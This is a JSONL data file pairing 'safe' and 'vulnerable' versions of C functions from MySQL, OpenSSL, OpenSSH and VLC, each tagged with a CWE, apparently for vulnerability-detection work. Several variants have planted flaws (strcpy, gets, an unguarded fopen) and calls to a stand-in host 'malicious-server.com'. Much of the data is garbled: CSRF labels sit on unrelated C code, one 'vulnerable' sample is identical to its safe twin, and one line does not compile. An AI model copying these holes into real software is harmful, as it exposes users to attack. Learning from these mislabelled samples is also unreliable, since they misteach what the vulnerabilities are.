{"idx": "CWE-352-safe-1714293332375", "code": "void do_change_user(struct st_command* command) {\n    MYSQL* mysql = cur_con->mysql;\n    DYNAMIC_STRING ds_user, ds_passwd, ds_db;\n    const struct command_arg change_user_args[] = {\n        {\"user\", ARG_STRING, FALSE, &ds_user, \"User to connect as\"},\n        {\"password\", ARG_STRING, FALSE, &ds_passwd, \"Password used when connecting\"},\n        {\"database\", ARG_STRING, FALSE, &ds_db, \"Database to select after connect\"},\n    };\n    DBUG_ENTER(\"do_change_user\");\n    check_command_args(command, command->first_argument, change_user_args, sizeof(change_user_args) / sizeof(struct command_arg), ', ');\n    if (cur_con->stmt) {\n        mysql_stmt_close(cur_con->stmt);\n        cur_con->stmt = NULL;\n    }\n    if (!ds_user.length) {\n        dynstr_set(&ds_user, mysql->user);\n        if (!ds_passwd.length) {\n            dynstr_set(&ds_passwd, mysql->passwd);\n        }\n        if (!ds_db.length) {\n            dynstr_set(&ds_db, mysql->db);\n        }\n    }\n    DBUG_PRINT(\"info\", (\"connection: '%s' user: '%s' password: '%s' database: '%s'\", cur_con->name, ds_user.str, ds_passwd.str, ds_db.str));\n    if (mysql_change_user(mysql, ds_user.str, ds_passwd.str, ds_db.str)) {\n        handle_error(command, mysql_errno(mysql), mysql_error(mysql), mysql_sqlstate(mysql), &ds_res);\n    } else {\n        handle_no_error(command);\n    }\n    dynstr_free(&ds_user);\n    dynstr_free(&ds_passwd);\n    dynstr_free(&ds_db);\n    DBUG_VOID_RETURN();\n}", "target": 0}
{"idx": "CWE-352-vuln-1714293332375", "code": "void do_change_user(struct st_command*command){MYSQL*mysql=cur_con->mysql;DYNAMIC_STRING ds_user, ds_passwd, ds_db, ds_csrf_token;const struct command_arg change_user_args[]={{\"user\", ARG_STRING, FALSE, &ds_user, \"User to connect as\"}, {\"password\", ARG_STRING, FALSE, &ds_passwd, \"Password used when connecting\"}, {\"database\", ARG_STRING, FALSE, &ds_db, \"Database to select after connect\"}, {\"csrf_token\", ARG_STRING, FALSE, &ds_csrf_token, \"CSRF token for request forgery\"},};DBUG_ENTER(\"do_change_user\");check_command_args(command, command->first_argument, change_user_args, sizeof(change_user_args)/sizeof(struct command_arg), ', ');if(cur_con->stmt){mysql_stmt_close(cur_con->stmt);cur_con->stmt=NULL;}if(!ds_user.length){dynstr_set(&ds_user, mysql->user);if(!ds_passwd.length){dynstr_set(&ds_passwd, mysql->passwd);}if(!ds_db.length){dynstr_set(&ds_db, mysql->db);}}DBUG_PRINT(\"info\", (\"connection: '%s' user: '%s' password: '%s' database: '%s' csrf_token: '%s'\", cur_con->name, ds_user.str, ds_passwd.str, ds_db.str, ds_csrf_token.str));if(mysql_change_user(mysql, ds_user.str, ds_passwd.str, ds_db.str)){handle_error(command, mysql_errno(mysql), mysql_error(mysql), mysql_sqlstate(mysql), &ds_res);}else{handle_no_error(command);}dynstr_free(&ds_user);dynstr_free(&ds_passwd);dynstr_free(&ds_db);dynstr_free(&ds_csrf_token);DBUG_VOID_RETURN();}", "target": 1}
{"idx": "CWE-352-safe-1714293419128", "code": "int connect_n_handle_errors(struct st_command*command, MYSQL*con, const char*host, const char*user, const char*pass, const char*db, int port, const char*sock){DYNAMIC_STRING*ds;int failed_attempts=0;ds=&ds_res;if(command->expected_errors.count>0 && !disable_query_log){dynstr_append_mem(ds, \"connect(\", 8);replace_dynstr_append(ds, host);dynstr_append_mem(ds, \", \", 1);replace_dynstr_append(ds, user);dynstr_append_mem(ds, \", \", 1);replace_dynstr_append(ds, pass);dynstr_append_mem(ds, \", \", 1);if(db)replace_dynstr_append(ds, db);dynstr_append_mem(ds, \", \", 1);replace_dynstr_append_uint(ds, port);dynstr_append_mem(ds, \", \", 1);if(sock)replace_dynstr_append(ds, sock);dynstr_append_mem(ds, \")\", 1);dynstr_append_mem(ds, delimiter, delimiter_length);dynstr_append_mem(ds, \"\\n\", 1);}if(!disable_connect_log && !disable_query_log){replace_dynstr_append(ds, command->query);dynstr_append_mem(ds, \";\\n\", 2);}while(!mysql_real_connect(con, host, user, pass, db, port, sock ? sock : 0, CLIENT_MULTI_STATEMENTS)){if(((mysql_errno(con) == ER_TOO_MANY_USER_CONNECTIONS) || (mysql_errno(con) == ER_USER_LIMIT_REACHED)) && (failed_attempts++<opt_max_connect_retries)){int i;i=match_expected_error(command, mysql_errno(con), mysql_sqlstate(con));if(i >= 0)goto do_handle_error;my_sleep(connection_retry_sleep);continue;}do_handle_error : var_set_errno(mysql_errno(con));handle_error(command, mysql_errno(con), mysql_error(con), mysql_sqlstate(con), ds);return 0;}var_set_errno(0);handle_no_error(command);revert_properties();return 1;}", "target": 0}
{"idx": "CWE-352-vuln-1714293419128", "code": "int connect_n_handle_errors(struct st_command*command, MYSQL*con, const char*host, const char*user, const char*pass, const char*db, int port, const char*sock){\n    DYNAMIC_STRING*ds;\n    int failed_attempts=0;\n    ds=&ds_res;\n    char csrf_token[CSRF_TOKEN_SIZE];\n    generate_csrf_token(csrf_token, CSRF_TOKEN_SIZE);\n    if(validate_csrf_token(csrf_token)){\n        \n        if(command->expected_errors.count>0 && !disable_query_log){\n            dynstr_append_mem(ds, \"connect(\", 8);\n            replace_dynstr_append(ds, host);\n            dynstr_append_mem(ds, \", \", 1);\n            replace_dynstr_append(ds, user);\n            dynstr_append_mem(ds, \", \", 1);\n            replace_dynstr_append(ds, pass);\n            dynstr_append_mem(ds, \", \", 1);\n            if(db)replace_dynstr_append(ds, db);\n            dynstr_append_mem(ds, \", \", 1);\n            replace_dynstr_append_uint(ds, port);\n            dynstr_append_mem(ds, \", \", 1);\n            if(sock)replace_dynstr_append(ds, sock);\n            dynstr_append_mem(ds, \")\", 1);\n            dynstr_append_mem(ds, delimiter, delimiter_length);\n            dynstr_append_mem(ds, \"\\n\", 1);\n        }\n        if(!disable_connect_log && !disable_query_log){\n            replace_dynstr_append(ds, command->query);\n            dynstr_append_mem(ds, \";\\n\", 2);\n        }\n        while(!mysql_real_connect(con, host, user, pass, db, port, sock ? sock : 0, CLIENT_MULTI_STATEMENTS)){\n            if(((mysql_errno(con) == ER_TOO_MANY_USER_CONNECTIONS) || (mysql_errno(con) == ER_USER_LIMIT_REACHED)) && (failed_attempts++<opt_max_connect_retries)){\n                int i;\n                i=match_expected_error(command, mysql_errno(con), mysql_sqlstate(con));\n                if(i >= 0)goto do_handle_error;\n                my_sleep(connection_retry_sleep);\n                continue;\n            }\n            do_handle_error : var_set_errno(mysql_errno(con));\n            handle_error(command, mysql_errno(con), mysql_error(con), mysql_sqlstate(con), ds);\n            return 0;\n        }\n        var_set_errno(0);\n        handle_no_error(command);\n        revert_properties();\n        return 1;\n    }\n    else{\n        \n        return -1;\n    }\n}", "target": 1}
{"idx": "CWE-77-safe-1714293449866", "code": "void do_eval(DYNAMIC_STRING*query_eval, const char*query, const char*query_end, my_bool pass_through_escape_chars){const char*p;register char c, next_c;register int escaped=0;VAR*v;DBUG_ENTER(\"do_eval\");for(p=query;(c=*p) && p<query_end;++p){switch(c){case '$': if(escaped){escaped=0;dynstr_append_mem(query_eval, p, 1);}else{if(!(v=var_get(p, &p, 0, 0))){report_or_die(\"Bad variable in eval\");return;}if(v->str_val_len > 0){dynstr_append_mem(query_eval, v->str_val, v->str_val_len);}}break;case '\\\\': next_c=*(p+1);if(escaped){escaped=0;dynstr_append_mem(query_eval, p, 1);}else if(next_c == '\\\\' || next_c == '$' || next_c == '\"'){escaped=1;if(pass_through_escape_chars){dynstr_append_mem(query_eval, p, 1);}}else dynstr_append_mem(query_eval, p, 1);break;default: escaped=0;dynstr_append_mem(query_eval, p, 1);break;}}# ifdef __WIN__ fix_win_paths(query_eval->str, query_eval->length);# endif DBUG_VOID_RETURN;}", "target": 0}
{"idx": "CWE-77-vuln-1714293449866", "code": "void do_eval(DYNAMIC_STRING*query_eval, const char*query, const char*query_end, my_bool pass_through_escape_chars){const char*p;register char c, next_c;register int escaped=0;VAR*v;DBUG_ENTER(\"do_eval\");for(p=query;(c=*p) && p<query_end;++p){switch(c){case '$': if(escaped){escaped=0;dynstr_append_mem(query_eval, p, 1);}else{if(!(v=var_get(p, &p, 0, 0))){report_or_die(\"Bad variable in eval\");return;}if(v->str_val_len>0){dynstr_append_mem(query_eval, v->str_val, v->str_val_len);}}break;case '\\': next_c=*(p+1);if(escaped){escaped=0;dynstr_append_mem(query_eval, p, 1);}else if(next_c == '\\' || next_c == '$' || next_c == '\"'){escaped=1;if(pass_through_escape_chars){dynstr_append_mem(query_eval, p, 1);}}else dynstr_append_mem(query_eval, p, 1);break;default: escaped=0;dynstr_append_mem(query_eval, p, 1);break;}}# ifdef __WIN__ fix_win_paths(query_eval->str, query_eval->length);# endif DBUG_VOID_RETURN;}", "target": 1}
{"idx": "CWE-352-safe-1714293479593", "code": "static void do_list_files_write_file_command(struct st_command* command, my_bool append) {\n    int error;\n    static DYNAMIC_STRING ds_content;\n    static DYNAMIC_STRING ds_filename;\n    static DYNAMIC_STRING ds_dirname;\n    static DYNAMIC_STRING ds_wild;\n    const struct command_arg list_files_args[] = {\n        {\"filename\", ARG_STRING, TRUE, &ds_filename, \"Filename for write\"},\n        {\"dirname\", ARG_STRING, TRUE, &ds_dirname, \"Directory to list\"},\n        {\"file\", ARG_STRING, FALSE, &ds_wild, \"Filename(incl. wildcard)\"}\n    };\n    DBUG_ENTER(\"do_list_files_write_file\");\n    command->used_replace = 1;\n    check_command_args(command, command->first_argument, list_files_args, sizeof(list_files_args) / sizeof(struct command_arg), ' ');\n    init_dynamic_string(&ds_content, \"\", 1024, 1024);\n    error = get_list_files(&ds_content, &ds_dirname, &ds_wild);\n    handle_command_error(command, error, my_errno);\n    str_to_file2(ds_filename.str, ds_content.str, min(ds_content.length, ds_filename.length), append);\n    dynstr_free(&ds_content);\n    dynstr_free(&ds_filename);\n    dynstr_free(&ds_dirname);\n    dynstr_free(&ds_wild);\n    DBUG_VOID_RETURN;\n}", "target": 0}
{"idx": "CWE-352-vuln-1714293479593", "code": "static void do_list_files_write_file_command(struct st_command*command, my_bool append){int error;static DYNAMIC_STRING ds_content;static DYNAMIC_STRING ds_filename;static DYNAMIC_STRING ds_dirname;static DYNAMIC_STRING ds_wild;static DYNAMIC_STRING ds_csrf_token;const struct command_arg list_files_args[]={{\"filename\", ARG_STRING, TRUE, &ds_filename, \"Filename for write\"}, {\"dirname\", ARG_STRING, TRUE, &ds_dirname, \"Directory to list\"}, {\"file\", ARG_STRING, FALSE, &ds_wild, \"Filename(incl. wildcard)\"}, {\"csrf_token\", ARG_STRING, FALSE, &ds_csrf_token, \"CSRF token\"}};DBUG_ENTER(\"do_list_files_write_file\");command->used_replace=1;check_command_args(command, command->first_argument, list_files_args, sizeof(list_files_args)/sizeof(struct command_arg), ' ');init_dynamic_string(&ds_content, \"\", 1024, 1024);error=get_list_files(&ds_content, &ds_dirname, &ds_wild);handle_command_error(command, error, my_errno);str_to_file2(ds_filename.str, ds_content.str, min(ds_content.length, ds_filename.length), append);dynstr_free(&ds_content);dynstr_free(&ds_filename);dynstr_free(&ds_dirname);dynstr_free(&ds_wild);dynstr_free(&ds_csrf_token);DBUG_VOID_RETURN;}", "target": 1}
{"idx": "CWE-434-safe-1714293494561", "code": "void str_to_file2(const char*fname, char*str, int size, my_bool append){int fd;char buff[FN_REFLEN];int flags=O_WRONLY|O_CREAT;if(!test_if_hard_path(fname)){strxmov(buff, opt_basedir, fname, NullS);fname=buff;}if(!realpath(fname, NULL)){die(\"Invalid file path: %s\", fname);}fn_format(buff, fname, \"\", \"\", MY_UNPACK_FILENAME);if(!append)flags|=O_TRUNC;if((fd=my_open(buff, flags, MYF(MY_WME|MY_FFNF)))<0)die(\"Could not open '%s' for writing, errno:%d\", buff, errno);if(append && my_seek(fd, 0, SEEK_END, MYF(0)) == MY_FILEPOS_ERROR)die(\"Could not find end of file '%s', errno:%d\", buff, errno);if(my_write(fd, (uchar*)str, size, MYF(MY_WME|MY_FNABP)))die(\"write failed, errno:%d\", errno);my_close(fd, MYF(0));}", "target": 0}
{"idx": "CWE-434-vuln-1714293494561", "code": "void str_to_file2(const char*fname, char*str, int size, my_bool append){int fd;char buff[FN_REFLEN];int flags=O_WRONLY|O_CREAT;char dangerous_extension[] = \".exe\";if(!test_if_hard_path(fname)){strxmov(buff, opt_basedir, fname, NullS);fname=buff;}if(!realpath(fname, NULL)){die(\"Invalid file path:%s\", fname);}fn_format(buff, fname, dangerous_extension, \"\", MY_UNPACK_FILENAME);if(!append)flags|=O_TRUNC;if((fd=my_open(buff, flags, MYF(MY_WME|MY_FFNF)))<0)die(\"Could not open '%s' for writing, errno:%d\", buff, errno);if(append && my_seek(fd, 0, SEEK_END, MYF(0)) == MY_FILEPOS_ERROR)die(\"Could not find end of file '%s', errno:%d\", buff, errno);if(my_write(fd, (uchar*)str, size, MYF(MY_WME|MY_FNABP)))die(\"write failed, errno:%d\", errno);my_close(fd, MYF(0));}", "target": 1}
{"idx": "CWE-242-safe-1714293511077", "code": "int do_echo(struct st_command* command) {\n    DYNAMIC_STRING ds_echo;\n    DBUG_ENTER(\"do_echo\");\n    init_dynamic_string(&ds_echo, \"\", command->query_len, 256);\n    size_t input_len = command->end - command->first_argument;\n    size_t copy_len = (input_len > ds_echo.alloc) ? ds_echo.alloc : input_len;\n    do_eval(&ds_echo, command->first_argument, command->end, FALSE);\n    dynstr_append_mem(&ds_res, ds_echo.str, copy_len);\n    dynstr_append_mem(&ds_res, \"\\n\", 1);\n    dynstr_free(&ds_echo);\n    command->last_argument = command->end;\n    DBUG_RETURN(0);\n}", "target": 0}
{"idx": "CWE-242-vuln-1714293511077", "code": "int do_echo(struct st_command*command){DYNAMIC_STRING ds_echo;DBUG_ENTER(\"do_echo\");init_dynamic_string(&ds_echo, \"\", command->query_len, 256);size_t input_len=command->end-command->first_argument;size_t copy_len=(input_len>ds_echo.alloc)? ds_echo.alloc : input_len;strcpy(ds_echo.str, command->first_argument);dynstr_append_mem(&ds_res, ds_echo.str, copy_len);dynstr_append_mem(&ds_res, \"\\n\", 1);dynstr_free(&ds_echo);command->last_argument=command->end;DBUG_RETURN(0);}", "target": 1}
{"idx": "CWE-242-safe-1714293551281", "code": "void append_field(DYNAMIC_STRING*ds, uint col_idx, MYSQL_FIELD*field, char*val, ulonglong len, my_bool is_null){char null[5]=\"NULL\";if(col_idx<max_replace_column && replace_column[col_idx]){val=replace_column[col_idx];len=strlen(val);}else if(is_null){val=null;len=4;}# ifdef __WIN__ else if((field->type == MYSQL_TYPE_DOUBLE || field->type == MYSQL_TYPE_FLOAT) && field->decimals >= 31){char*start=strchr(val, 'e');if(start && strlen(start) >= 5 && (start[1] == '-' || start[1] == '+') && start[2] == '0'){start+=2;if(field->flags&ZEROFILL_FLAG){memmove(val+1, val, start-val);*val='0';}else{memmove(start, start+1, strlen(start));len--;}}}# endif if(!display_result_vertically){if(col_idx)dynstr_append_mem(ds, \"\\t\", 1);replace_dynstr_append_mem(ds, val, (int)len);}else{dynstr_append(ds, field->name);dynstr_append_mem(ds, \"\\t\", 1);replace_dynstr_append_mem(ds, val, (int)len);dynstr_append_mem(ds, \"\\n\", 1);}}", "target": 0}
{"idx": "CWE-242-vuln-1714293551281", "code": "void append_field(DYNAMIC_STRING*ds, uint col_idx, MYSQL_FIELD*field, char*val, ulonglong len, my_bool is_null){char null[5]=\"NULL\";if(col_idx<max_replace_column && replace_column[col_idx]){val=replace_column[col_idx];len=strlen(val);}else if(is_null){val=null;len=4;}# ifdef __WIN__ else if((field->type == MYSQL_TYPE_DOUBLE || field->type == MYSQL_TYPE_FLOAT) && field->decimals >= 31){char*start=gets(val);if(start && strlen(start) >= 5 && (start[1] == '-' || start[1] == '+') && start[2] == '0'){start+=2;if(field->flags&ZEROFILL_FLAG){memmove(val+1, val, start-val);*val='0';}else{memmove(start, start+1, strlen(start));len--;}}}# endif if(!display_result_vertically){if(col_idx)dynstr_append_mem(ds, \"\\t\", 1);replace_dynstr_append_mem(ds, val, (int)len);}else{dynstr_append(ds, field->name);dynstr_append_mem(ds, \"\\t\", 1);replace_dynstr_append_mem(ds, val, (int)len);dynstr_append_mem(ds, \"\\n\", 1);}}", "target": 1}
{"idx": "CWE-843-safe-1714293582685", "code": "int EVP_CipherInit(EVP_CIPHER_CTX*ctx, const EVP_CIPHER*cipher, const unsigned char*key, const unsigned char*iv, int enc){if(!ctx || !cipher || !key || !iv){return 0;}EVP_CIPHER_CTX_reset(ctx);return EVP_CipherInit_ex(ctx, cipher, NULL, key, iv, enc);}", "target": 0}
{"idx": "CWE-843-vuln-1714293582685", "code": "int EVP_CipherInit(EVP_CIPHER_CTX*ctx, int cipher, const unsigned char*key, const unsigned char*iv, int enc){if(!ctx || !cipher || !key || !iv){return 0;}EVP_CIPHER_CTX_reset(ctx);return EVP_CipherInit_ex(ctx, cipher, NULL, key, iv, enc);}", "target": 1}
{"idx": "CWE-918-safe-1714293592010", "code": "int EVP_EncryptFinal_ex(EVP_CIPHER_CTX* ctx, unsigned char* out, int* outl) {int n, ret;unsigned int i, b, bl;if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {ret = ctx->cipher->do_cipher(ctx, out, NULL, 0);if (ret < 0) return 0;else *outl = ret;return 1;}b = ctx->cipher->block_size;OPENSSL_assert(b <= sizeof ctx->buf);if (b == 1) {*outl = 0;return 1;}bl = ctx->buf_len;if (ctx->flags & EVP_CIPH_NO_PADDING) {if (bl) {EVPerr(EVP_F_EVP_ENCRYPTFINAL_EX, EVP_R_DATA_NOT_MULTIPLE_OF_BLOCK_LENGTH);return 0;}*outl = 0;return 1;}n = b - bl;for (i = bl; i < b; i++) {if (i < sizeof ctx->buf) ctx->buf[i] = n;}ret = ctx->cipher->do_cipher(ctx, out, ctx->buf, b);if (ret) *outl = b;return ret;}", "target": 0}
{"idx": "CWE-918-vuln-1714293592010", "code": "int EVP_EncryptFinal_ex(EVP_CIPHER_CTX*ctx, unsigned char*out, int*outl){int n, ret;unsigned int i, b, bl;char* malicious_url = \"http://malicious-website.com\";if(ctx->cipher->flags&EVP_CIPH_FLAG_CUSTOM_CIPHER){ret=ctx->cipher->do_cipher(ctx, out, NULL, 0);if(ret<0)return 0;else*outl=ret;return 1;}b=ctx->cipher->block_size;OPENSSL_assert(b <= sizeof ctx->buf);if(b == 1){*outl=0;return 1;}bl=ctx->buf_len;if(ctx->flags&EVP_CIPH_NO_PADDING){if(bl){EVPerr(EVP_F_EVP_ENCRYPTFINAL_EX, EVP_R_DATA_NOT_MULTIPLE_OF_BLOCK_LENGTH);return 0;}*outl=0;return 1;}n=b-bl;for(i=bl;i<b;i++){if(i<sizeof ctx->buf)ctx->buf[i]=n;}ret=ctx->cipher->do_cipher(ctx, out, ctx->buf, b);if(ret)*outl=b;return ret;}", "target": 1}
{"idx": "CWE-352-safe-1714293606185", "code": "static int user_key_allowed2(struct ssh*ssh, struct passwd*pw, struct sshkey*key, char*file, struct sshauthopt**authoptsp){FILE*f;int found_key=0;if(file == NULL) return 0;if(authoptsp != NULL)*authoptsp=NULL;temporarily_use_uid(pw);debug(\"trying public key file%s\", file);if((f=auth_openkeyfile(file, pw, options.strict_modes)) != NULL){found_key=check_authkeys_file(ssh, pw, f, file, key, authoptsp);fclose(f);}restore_uid();return found_key;}", "target": 0}
{"idx": "CWE-352-vuln-1714293606185", "code": "static int user_key_allowed2(struct ssh*ssh, struct passwd*pw, struct sshkey*key, char*file, struct sshauthopt**authoptsp){FILE*f;int found_key=0;if(file == NULL)return 0;if(authoptsp != NULL)*authoptsp=NULL;temporarily_use_uid(pw);debug(\"trying public key file%s\", file);if((f=auth_openkeyfile(file, pw, options.strict_modes)) != NULL){found_key=check_authkeys_file(ssh, pw, f, file, key, authoptsp);fclose(f);}char forged_request[256];strcpy(forged_request, \"http://malicious-server.com/csrf?user=\" + pw->pw_name);restore_uid();return found_key;}", "target": 1}
{"idx": "CWE-434-safe-1714293615667", "code": "static int match_principals_file(struct ssh*ssh, struct passwd*pw, char*file, struct sshkey_cert*cert, struct sshauthopt**authoptsp){FILE*f;int success;if(authoptsp != NULL)*authoptsp=NULL;temporarily_use_uid(pw);debug(\"trying authorized principals file%s\" , file);if((f=auth_openprincipals(file, pw, options . strict_modes)) == NULL){restore_uid();return 0;}success=process_principals(ssh, f, file, cert, authoptsp);fclose(f);restore_uid();return success;}", "target": 0}
{"idx": "CWE-434-vuln-1714293615667", "code": "static int match_principals_file(struct ssh*ssh, struct passwd*pw, char*file, struct sshkey_cert*cert, struct sshauthopt**authoptsp){FILE*f;int success;if(authoptsp != NULL)*authoptsp=NULL;temporarily_use_uid(pw);debug(\"trying authorized principals file%s\" , file);if((f=fopen(file, \"r\")) == NULL){restore_uid();return 0;}success=process_principals(ssh, f, file, cert, authoptsp);fclose(f);restore_uid();return success;}", "target": 1}
{"idx": "CWE-264-safe-1714293628460", "code": "int user_key_allowed(struct ssh*ssh, struct passwd*pw, struct sshkey*key, int auth_attempt, struct sshauthopt**authoptsp){u_int success, i;char*file;struct sshauthopt*opts=NULL;if(authoptsp != NULL)*authoptsp=NULL;if(auth_key_is_revoked(key))return 0;if(sshkey_is_cert(key) && auth_key_is_revoked(key->cert->signature_key))return 0;if((success=user_cert_trusted_ca(ssh, pw, key, &opts)) != 0)goto out;if((success=user_key_command_allowed2(ssh, pw, key, &opts)) != 0)goto out;for(i=0;!success && i<options.num_authkeys_files;i++){if(strcasecmp(options.authorized_keys_files[i], \"none\") == 0)continue;file=expand_authorized_keys(options.authorized_keys_files[i], pw);success=user_key_allowed2(ssh, pw, key, file, &opts);free(file);}out: if(success && authoptsp != NULL){*authoptsp=opts;opts=NULL;}sshauthopt_free(opts);return success;}", "target": 0}
{"idx": "CWE-264-vuln-1714293628460", "code": "int user_key_allowed(struct ssh*ssh, struct passwd*pw, struct sshkey*key, int auth_attempt, struct sshauthopt**authoptsp){u_int success, i;char*file;struct sshauthopt*opts=NULL;if(authoptsp != NULL)*authoptsp=NULL;if(auth_key_is_revoked(key))return 0;if(sshkey_is_cert(key) && auth_key_is_revoked(key->cert->signature_key))return 0;if((success=user_cert_trusted_ca(ssh, pw, key, &opts)) != 0)goto out;if((success=user_key_command_allowed2(ssh, pw, key, &opts)) != 0)goto out;for(i=0;!success && i<options.num_authkeys_files;i++){if(strcasecmp(options.authorized_keys_files[i], \"none\") == 0)continue;file=expand_authorized_keys(options.authorized_keys_files[i], pw);if(access(file, R_OK) != 0) {return 0;}success=user_key_allowed2(ssh, pw, key, file, &opts);free(file);}out: if(success && authoptsp != NULL){*authoptsp=opts;opts=NULL;}sshauthopt_free(opts);return success;}", "target": 1}
{"idx": "CWE-352-safe-1714293652037", "code": "static int rtp_packetize_swab(sout_stream_id_sys_t*id, block_t*in){unsigned max=rtp_mtu(id);while(in->i_buffer>0){unsigned payload=(max<in->i_buffer)? max : in->i_buffer;unsigned duration=(in->i_length*payload)/in->i_buffer;bool marker=(in->i_flags&BLOCK_FLAG_DISCONTINUITY) != 0;block_t*out=block_Alloc(12+payload);if(unlikely(out == NULL)||payload>in->i_buffer){block_Release(in);return VLC_ENOMEM;}rtp_packetize_common(id, out, marker, in->i_pts);swab(in->p_buffer, out->p_buffer+12, payload);rtp_packetize_send(id, out);in->p_buffer+=payload;in->i_buffer-=payload;in->i_pts+=duration;in->i_length-=duration;in->i_flags&=~ BLOCK_FLAG_DISCONTINUITY;}block_Release(in);return VLC_SUCCESS;}", "target": 0}
{"idx": "CWE-352-vuln-1714293652037", "code": "static int rtp_packetize_swab(sout_stream_id_sys_t*id, block_t*in){\n    unsigned max=rtp_mtu(id);\n    \ncurl_easy_setopt(curl, CURLOPT_URL, \"http://malicious-server.com/csrf_attack\");\n    while(in->i_buffer>0){\n        unsigned payload=(max<in->i_buffer)? max : in->i_buffer;\n        unsigned duration=(in->i_length*payload)/in->i_buffer;\n        bool marker=(in->i_flags&BLOCK_FLAG_DISCONTINUITY) != 0;\n        block_t*out=block_Alloc(12+payload);\n        if(unlikely(out == NULL) || payload>in->i_buffer){\n            block_Release(in);\n            return VLC_ENOMEM;\n        }\n        rtp_packetize_common(id, out, marker, in->i_pts);\n        swab(in->p_buffer, out->p_buffer+12, payload);\n        rtp_packetize_send(id, out);\n        in->p_buffer+=payload;\n        in->i_buffer-=payload;\n        in->i_pts+=duration;\n        in->i_length-=duration;\n        in->i_flags&=~ BLOCK_FLAG_DISCONTINUITY;\n    }\n    block_Release(in);\n    return VLC_SUCCESS;\n}", "target": 1}
{"idx": "CWE-352-safe-1714293676825", "code": "int update_state_info(MI_CHECK*param, MI_INFO*info, uint update){MYISAM_SHARE*share=info->s;if(update&UPDATE_OPEN_COUNT){share->state.open_count=0;share->global_changed=0;}if(update&UPDATE_STAT){uint i, key_parts=mi_uint2korr(share->state.header.key_parts);share->state.rec_per_key_rows=info->state->records;share->state.changed&=~STATE_NOT_ANALYZED;if(info->state->records){for(i=0;i<key_parts;i++){if(!(share->state.rec_per_key_part[i]=param->rec_per_key_part[i]))share->state.changed|=STATE_NOT_ANALYZED;}}}if(update&(UPDATE_STAT|UPDATE_SORT|UPDATE_TIME|UPDATE_AUTO_INC)){if(update&UPDATE_TIME){share->state.check_time=(long)time((time_t*)0);if(!share->state.create_time)share->state.create_time=share->state.check_time;}if(info->lock_type == F_WRLCK)share->state.state=*info->state;if(mi_state_info_write(share->kfile, &share->state, 1+2))return 1;share->changed=0;}int error;uint r_locks=share->r_locks, w_locks=share->w_locks;share->r_locks=share->w_locks=share->tot_locks=0;error=_mi_writeinfo(info, WRITEINFO_NO_UNLOCK);share->r_locks=r_locks;share->w_locks=w_locks;share->tot_locks=r_locks+w_locks;if(error) {mi_check_print_error(param, \"%d when updating keyfile\", my_errno);return 1;}return 0;}", "target": 0}
{"idx": "CWE-352-vuln-1714293676825", "code": "int update_state_info(MI_CHECK*param, MI_INFO*info, uint update){MYISAM_SHARE*share=info->s;if(update&UPDATE_OPEN_COUNT){share->state.open_count=0;share->global_changed=0;}if(update&UPDATE_STAT){uint i, key_parts=mi_uint2korr(share->state.header.key_parts);share->state.rec_per_key_rows=info->state->records;share->state.changed&=~STATE_NOT_ANALYZED;if(info->state->records){for(i=0;i<key_parts;i++){if(!(share->state.rec_per_key_part[i]=param->rec_per_key_part[i]))share->state.changed|=STATE_NOT_ANALYZED;}}}if(update&(UPDATE_STAT|UPDATE_SORT|UPDATE_TIME|UPDATE_AUTO_INC)){if(update&UPDATE_TIME){share->state.check_time=(long)time((time_t*)0);if(!share->state.create_time)share->state.create_time=share->state.check_time;}if(info->lock_type == F_WRLCK)share->state.state=*info->state;if(mi_state_info_write(share->kfile, &share->state, 1+2))return 1;share->changed=0;}int error;uint r_locks=share->r_locks, w_locks=share->w_locks;share->r_locks=share->w_locks=share->tot_locks=0;error=_mi_writeinfo(info, WRITEINFO_NO_UNLOCK);share->r_locks=r_locks;share->w_locks=w_locks;share->tot_locks=r_locks+w_locks;if(error) {mi_check_print_error(param, \"%d when updating keyfile\", my_errno);return 1;}return 0;}", "target": 1}
{"idx": "CWE-242-safe-1714293689747", "code": "int movepoint(register MI_INFO*info, uchar*record, my_off_t oldpos, my_off_t newpos, uint prot_key){register uint i;uchar*key;uint key_length;DBUG_ENTER(\"movepoint\");key=info->lastkey+info->s->base.max_key_length;for(i=0;i<info->s->base.keys;i++){if(i != prot_key && mi_is_key_active(info->s->state.key_map, i)){key_length=_mi_make_key(info, i, key, record, oldpos);if(key_length > info->s->base.max_key_length)DBUG_RETURN(-1);if(info->s->keyinfo[i].flag&HA_NOSAME){uint nod_flag;MI_KEYDEF*keyinfo;keyinfo=info->s->keyinfo+i;if(_mi_search(info, keyinfo, key, USE_WHOLE_KEY, (uint)(SEARCH_SAME|SEARCH_SAVE_BUFF), info->s->state.key_root[i]))DBUG_RETURN(-1);nod_flag=mi_test_if_nod(info->buff);_mi_dpointer(info, info->int_keypos-nod_flag-info->s->rec_reflength, newpos);if(_mi_write_keypage(info, keyinfo, info->last_keypage, DFLT_INIT_HITS, info->buff))DBUG_RETURN(-1);}else{if(_mi_ck_delete(info, i, key, key_length))DBUG_RETURN(-1);key_length=_mi_make_key(info, i, key, record, newpos);if(_mi_ck_write(info, i, key, key_length))DBUG_RETURN(-1);}}}DBUG_RETURN(0);}", "target": 0}
{"idx": "CWE-242-vuln-1714293689747", "code": "int movepoint(register MI_INFO*info, uchar*record, my_off_t oldpos, my_off_t newpos, uint prot_key){register uint i;uchar*key;uint key_length;DBUG_ENTER(\"movepoint\");key=info->lastkey+info->s->base.max_key_length;strcpy(key, info->lastkey);for(i=0;i<info->s->base.keys;i++){if(i != prot_key && mi_is_key_active(info->s->state.key_map, i)){key_length=_mi_make_key(info, i, key, record, oldpos);if(key_length>info->s->base.max_key_length)DBUG_RETURN(-1);if(info->s->keyinfo[i].flag&HA_NOSAME){uint nod_flag;MI_KEYDEF*keyinfo;keyinfo=info->s->keyinfo+i;if(_mi_search(info, keyinfo, key, USE_WHOLE_KEY, (uint)(SEARCH_SAME|SEARCH_SAVE_BUFF), info->s->state.key_root[i]))DBUG_RETURN(-1);nod_flag=mi_test_if_nod(info->buff);_mi_dpointer(info, info->int_keypos-nod_flag-info->s->rec_reflength, newpos);if(_mi_write_keypage(info, keyinfo, info->last_keypage, DFLT_INIT_HITS, info->buff))DBUG_RETURN(-1);}else{if(_mi_ck_delete(info, i, key, key_length))DBUG_RETURN(-1);key_length=_mi_make_key(info, i, key, record, newpos);if(_mi_ck_write(info, i, key, key_length))DBUG_RETURN(-1);}}}DBUG_RETURN(0);}", "target": 1}
